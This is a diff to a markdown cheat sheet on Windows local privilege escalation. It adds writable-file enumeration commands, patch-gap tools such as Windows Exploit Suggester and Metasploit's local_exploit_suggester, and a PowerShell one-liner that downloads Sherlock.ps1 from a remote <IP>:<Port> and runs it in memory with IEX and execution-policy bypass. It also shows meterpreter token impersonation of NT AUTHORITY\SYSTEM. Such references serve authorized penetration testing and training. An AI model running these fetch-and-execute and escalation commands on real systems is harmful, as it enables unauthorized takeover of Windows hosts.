@@ -22,6 +22,8 @@ current system:
 | **Environement variables** | set | Get-ChildItem Env: &#124; ft Key,Value ||
 | **Credential Manager** | cmdkey /list | | |
 | **Mounted disks** | | | wmic volume get DriveLetter,FileSystem,Capacity |
+| **Writable directories** | dir /a-rd /s /b | | |
+| **Writable files** | dir /a-r-d /s /b | | |
 
 ###### Patching level
 
@@ -64,6 +66,65 @@ interfaces and active connections of the host:
 
 ###### Unpatched system
 
+Compare patch level to public known exploits offclient:
+
+** Windows Exploit Suggester **
+
+The windows-exploit-suggester tool compares a targets patch levels against the
+Microsoft vulnerability database in order to detect potential missing patches
+on the target.  
+It also notifies the user if there are public exploits and Metasploit modules
+available for the missing bulletins.  
+It requires the 'systeminfo' command output from a Windows host in order to
+compare that the Microsoft security bulletin database and determine the patch
+level of the host.  
+It has the ability to automatically download the security bulletin database
+from Microsoft with the --update flag, and saves it as an Excel spreadsheet.
+
+```
+# python windows-exploit-suggester.py --update
+
+python /opt/priv_esc/windows/windows-exploit-suggester.py --database <XLS> --systeminfo <SYSTEMINFO>
+```
+
+If the 'systeminfo' command reveals 'File 1' as the output for the hotfixes,
+try executing 'wmic qfe list full' and feed that as input with the --hotfixes
+flag, along with the 'systeminfo':
+
+```
+python windows-exploit-suggester.py --database <XLS> --systeminfo <SYSTEMINFO> --hotfixes <HOTFIXES>
+```
+
+**Sherlock**
+
+PowerShell script to find missing software patches for critical vulnerabilities
+that could be leveraged for local privilege escalation.
+
+To download and execute directly into memory:
+
+```
+# CMD
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<Port>/Sherlock.ps1')"; Find-AllVulns
+
+# PowerShell
+IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<Port>/Sherlock.ps1'); Find-AllVulns
+```
+
+** Metasploit - Local Exploit Suggester **
+
+The Local Exploit Suggester module suggests local meterpreter exploits that can
+ be used against the target, based on the architecture and platform as well as
+ the available exploits in meterpreter.
+
+ ```
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+# OR
+
+msf > use post/multi/recon/local_exploit_suggester
+msf post(local_exploit_suggester) > set SESSION <session-id>
+msf post(local_exploit_suggester) > run
+```
 
 ###### System misconfigurations exploits
 
@@ -114,7 +175,7 @@ meterpreter > execute -f 'MSFRottenPotato.exe'
 # The NT AUTHORITY\SYSTEM token should be available as a delegation token
 # Even if the token is not displayed it might be available and the impersonation should be tried anyway
 meterpreter > list_tokens -u
-meterpreter > impersonate 'NT AUTHORITY\SYSTEM'
+meterpreter > impersonate_token 'NT AUTHORITY\SYSTEM'
 ```
 
 *LonelyPottato (RottenPotato w/o Metasploit)*
